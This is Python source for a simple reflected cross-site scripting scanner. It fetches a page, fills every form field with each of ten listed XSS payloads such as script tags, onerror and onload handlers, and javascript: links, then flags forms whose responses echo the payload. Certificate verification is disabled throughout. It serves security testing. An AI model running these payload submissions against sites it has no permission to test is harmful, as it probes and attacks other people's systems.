import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import warnings

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<iframe src=javascript:alert("XSS")></iframe>',
    '<a href=javascript:alert("XSS")>Click me</a>',
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>Hover over me</div>',
    '<input type="text" value=<script>alert("XSS")</script>>',
    '<textarea><script>alert("XSS")</script></textarea>',
]

def xss_scan(url):
    """Scans a URL for basic XSS vulnerabilities."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        try:
            forms = BeautifulSoup(requests.get(url, verify=False).content, 'html.parser').find_all('form')
        except requests.exceptions.RequestException:
            return []

    vulnerable_forms = []

    for form in forms:
        for payload in XSS_PAYLOADS:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])

            data = {}
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    data[name] = payload

            try:
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    if method == 'post':
                        response = requests.post(urljoin(url, action), data=data, verify=False)
                    else:
                        response = requests.get(urljoin(url, action), params=data, verify=False)

                if payload in response.text:
                    vulnerable_forms.append((action, method, payload))
                    # Move to the next form after finding one vulnerability
                    break
            except requests.exceptions.RequestException:
                pass

    return vulnerable_forms